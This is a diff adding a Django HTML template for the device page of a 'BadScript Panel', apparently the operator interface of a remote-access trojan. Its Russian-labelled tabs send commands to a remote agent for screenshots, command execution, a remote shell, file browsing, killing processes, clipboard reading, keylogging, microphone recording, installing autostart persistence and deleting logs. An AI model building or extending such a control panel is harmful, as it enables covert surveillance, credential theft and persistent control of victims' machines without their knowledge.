@@ -1,0 +1,161 @@
+{% extends 'base.html' %}
+{% block title %}{{ device.name }} — BadScript Panel{% endblock %}
+
+{% block content %}
+<div class="device-header">
+    <a href="{% url 'dashboard' %}" class="btn btn-outline btn-sm">&larr; Назад</a>
+    <h2>{{ device.name }}</h2>
+    <div id="agent-status" class="agent-status">
+        <span class="dot" id="status-dot"></span>
+        <span id="status-text">Проверка...</span>
+    </div>
+</div>
+
+<!-- Вкладки -->
+<div class="tabs">
+    <button class="tab active" data-tab="tab-screenshot">&#x1f4f8; Скриншот</button>
+    <button class="tab" data-tab="tab-exec">&#x1f4bb; Команда</button>
+    <button class="tab" data-tab="tab-shell">&#x1f5a5; Терминал</button>
+    <button class="tab" data-tab="tab-files">&#x1f4c1; Файлы</button>
+    <button class="tab" data-tab="tab-processes">&#x2699; Процессы</button>
+    <button class="tab" data-tab="tab-sysinfo">&#x1f4ca; Система</button>
+    <button class="tab" data-tab="tab-keylog">&#x2328; Кейлоггер</button>
+    <button class="tab" data-tab="tab-audio">&#x1f3a4; Аудио</button>
+    <button class="tab" data-tab="tab-manage">&#x1f527; Управление</button>
+</div>
+
+<!-- Скриншот -->
+<div class="tab-content active" id="tab-screenshot">
+    <div class="tab-toolbar">
+        <button class="btn btn-primary" onclick="sendCmd('screenshot', {quality: 70})">
+            &#x1f4f7; Сделать скриншот
+        </button>
+    </div>
+    <div id="screenshot-container" class="screenshot-box">
+        <p class="placeholder">Нажмите кнопку для получения скриншота</p>
+    </div>
+</div>
+
+<!-- Выполнить команду -->
+<div class="tab-content" id="tab-exec">
+    <div class="tab-toolbar">
+        <input type="text" id="exec-input" class="form-input" placeholder="Введите команду..."
+               onkeydown="if(event.key==='Enter') execCmd()">
+        <button class="btn btn-primary" onclick="execCmd()">Выполнить</button>
+    </div>
+    <pre id="exec-output" class="output-box"></pre>
+</div>
+
+<!-- Терминал -->
+<div class="tab-content" id="tab-shell">
+    <div class="tab-toolbar">
+        <button class="btn btn-primary" id="shell-toggle" onclick="toggleShell()">
+            Открыть Shell
+        </button>
+    </div>
+    <pre id="shell-output" class="output-box terminal"></pre>
+    <div class="shell-input-row" style="display:none" id="shell-input-row">
+        <span class="shell-prompt">&gt;</span>
+        <input type="text" id="shell-input" class="form-input"
+               onkeydown="if(event.key==='Enter') shellSend()">
+    </div>
+</div>
+
+<!-- Файлы -->
+<div class="tab-content" id="tab-files">
+    <div class="tab-toolbar">
+        <input type="text" id="fs-path" class="form-input" value="." placeholder="Путь...">
+        <button class="btn btn-primary" onclick="fsBrowse()">&#x1f4c2; Обзор</button>
+    </div>
+    <div id="fs-list" class="fs-list"></div>
+</div>
+
+<!-- Процессы -->
+<div class="tab-content" id="tab-processes">
+    <div class="tab-toolbar">
+        <button class="btn btn-primary" onclick="sendCmd('process_list', {})">
+            &#x1f504; Обновить
+        </button>
+        <input type="text" id="kill-input" class="form-input" placeholder="PID или имя">
+        <button class="btn btn-danger" onclick="killProc()">Kill</button>
+    </div>
+    <div id="process-list" class="output-box" style="max-height:500px;overflow:auto;"></div>
+</div>
+
+<!-- Система -->
+<div class="tab-content" id="tab-sysinfo">
+    <div class="tab-toolbar">
+        <button class="btn btn-primary" onclick="sendCmd('sysinfo', {})">
+            &#x1f4ca; Обновить
+        </button>
+        <button class="btn btn-outline" onclick="sendCmd('clipboard_get', {})">
+            &#x1f4cb; Буфер обмена
+        </button>
+    </div>
+    <pre id="sysinfo-output" class="output-box"></pre>
+</div>
+
+<!-- Кейлоггер -->
+<div class="tab-content" id="tab-keylog">
+    <div class="tab-toolbar">
+        <button class="btn btn-primary" onclick="sendCmd('keylog_start', {})">&#x25b6; Start</button>
+        <button class="btn btn-outline" onclick="sendCmd('keylog_stop', {})">&#x23f9; Stop</button>
+        <button class="btn btn-outline" onclick="sendCmd('keylog_get', {})">&#x1f4e5; Get</button>
+    </div>
+    <pre id="keylog-output" class="output-box"></pre>
+</div>
+
+<!-- Аудио -->
+<div class="tab-content" id="tab-audio">
+    <div class="tab-toolbar">
+        <button class="btn btn-primary" onclick="sendCmd('audio_start', {duration: 30})">
+            &#x1f534; Запись 30с
+        </button>
+        <button class="btn btn-outline" onclick="sendCmd('audio_stop', {})">&#x23f9; Стоп</button>
+        <button class="btn btn-outline" onclick="sendCmd('audio_list', {})">&#x1f4c3; Список</button>
+    </div>
+    <pre id="audio-output" class="output-box"></pre>
+</div>
+
+<!-- Управление -->
+<div class="tab-content" id="tab-manage">
+    <div class="manage-grid">
+        <div class="manage-section">
+            <h4>&#x1f50c; Соединение</h4>
+            <button class="btn btn-outline" onclick="sendCmd('ping', {})">Ping</button>
+            <button class="btn btn-outline" onclick="sendCmd('heartbeat', {})">Heartbeat</button>
+        </div>
+        <div class="manage-section">
+            <h4>&#x1f504; Обновление</h4>
+            <button class="btn btn-primary" onclick="sendCmd('update', {})">
+                Обновить с GitHub
+            </button>
+            <button class="btn btn-outline" onclick="sendCmd('server_restart', {})">
+                Перезапустить агент
+            </button>
+        </div>
+        <div class="manage-section">
+            <h4>&#x2699; Автозапуск</h4>
+            <button class="btn btn-outline" onclick="sendCmd('install_autostart', {})">
+                Установить
+            </button>
+            <button class="btn btn-outline" onclick="sendCmd('remove_autostart', {})">
+                Удалить
+            </button>
+        </div>
+        <div class="manage-section">
+            <h4>&#x1f4c4; Логи сервера</h4>
+            <button class="btn btn-outline" onclick="sendCmd('log_view', {})">Просмотр</button>
+            <button class="btn btn-danger" onclick="sendCmd('log_delete', {})">Удалить</button>
+        </div>
+    </div>
+    <pre id="manage-output" class="output-box"></pre>
+</div>
+
+<input type="hidden" id="device-id" value="{{ device.pk }}">
+<input type="hidden" id="device-uid" value="{{ device.uid }}">
+{% endblock %}
+
+{% block extra_js %}
+<script src="/static/js/device.js"></script>
+{% endblock %}
